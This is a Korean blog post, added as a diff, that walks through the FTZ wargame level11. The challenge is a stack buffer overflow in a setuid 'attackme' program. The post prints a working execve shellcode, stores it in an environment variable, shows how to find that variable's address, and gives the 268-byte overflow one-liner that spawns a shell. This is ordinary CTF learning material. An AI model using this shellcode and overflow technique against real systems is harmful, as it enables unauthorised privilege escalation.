@@ -4,3 +4,96 @@ title:  "FTZ level11"
 date:   2020-09-04 13:27
 categories: blog
 ---
+
+FTZ level11 를 풀어보겠다.
+
+![cat](/blog_img/ftz11_cat.png)
+
+```shell
+[level11@ftz level11]$cat hint
+```
+##### cat [OPTION] [FILE]
+##### cat - 파일 이름으로 인자받아 이어주는 명령어
+
+먼저 해당 c언어가 컴파일된것이 attackme 파일인걸로 추정한다 
+
+![run](/blog_img/level11_run.png)
+
+attackme 파일을 실행하면은 hint에 있는 c 언어로 작성된 코드와 똑같이 작동합니다.
+
+그러면은 이제 attackme 를 분석하기위해 gdb 명령어를 사용하여 디버깅을 해봐야겠다.
+
+```shell
+$gdb attackme
+
+(gdb) set disas intel
+(gdb) disas main
+```
+
+![gdb](/blog_img/ftz_level11_gdb.png)
+
+<main+3>: sub   esp,0x108
+이라는것이 보이는데 0x108 은 C 언어 코드에서 char str[256]; 이나 마찬가지다 
+즉 256 만큼 배열되는것에서 +8 쓰레기 값이 붙어서 264 만큼의 값이 있는것이고
+
+BOF(버퍼오버플로우)를 하게된다면 자주 접하는게 ret sfp 가 있다 여기에서 제일 중요한것은 sfp(스텍 베이스) 값을 뜻한다.
+sfp 는 스택 주소값을 계산할깨 스택값 바닥 프레임 포인터 값을 저장하는것이라고 하는데 이 크기는 4바이트이므로 
+
+bof 를 내기위해서는 108 + sfp 크기 인 268 만큼의 입력을 한 다음 쉘코드를 실행하면 된다.
+
+```shell
+\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\xb0\x01\xcd\x80
+```
+
+해당 쉘 코드로 환경변수를 이용하여 bof 를 해야된다.
+
+먼저 linux 에서 환경 변수 등록 명령어는 export 이다.
+
+```shell
+export EGG=`python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\xb0\x01\xcd\x80"'` 
+```
+
+와 같이 입력을 한 다음 해당 환경변수를 불러오기 위해 c언어로 해당 변수를 불러오는 주소를 알아오자
+
+```
+#include <stdio.h>
+int main(){
+    printf("print : %x\n",getenv("EGG"));
+    return 0;
+}
+```
+이런식으로 getenv 함수를 이용해서 주소값을 출력하면은 
+
+![buff](/blog_img/buffx.png)
+
+이렇게 주소값이 16진수로 나오게 된다.
+
+*해당 주소값은 사람마다 다 다를수있으니 따라서 하면 안된다. 
+
+그러면은 이 다양한 기능들을 이용해서 bof 를 수행하기 위해 python -c 를 넘기는 경우가 많다
+
+어떠한 파일이 test 가 있다고 한다면
+
+./test `python -c 'print "hello"'`
+- test 파일에서 인자로 넘긴다.
+
+(python -c 'print "hello"';cat) | ./test
+- test 파일에서 실행중 중간에 입력이 된다.
+
+우리가 해야될것은 1번째인 인자로 넘겨야된다.
+
+이제 attackme 파일에서 argv[1] 로 strcpy 를 사용하기떄문에
+
+명령어를 입력하여 하고싶다면은 
+
+```shell
+./attackme `python -c 'print "A"*268+"\x22\xfc\xff\xbf"'`
+```
+
+16진수로 나온 환경 변수 주소값을 거꿀로 해서 입력해야된다.
+
+입력하고 my-pass 를 해야된다.
+
+![my-pass](/blog_img/level12.my_pass.png)
+
+password:it is like this
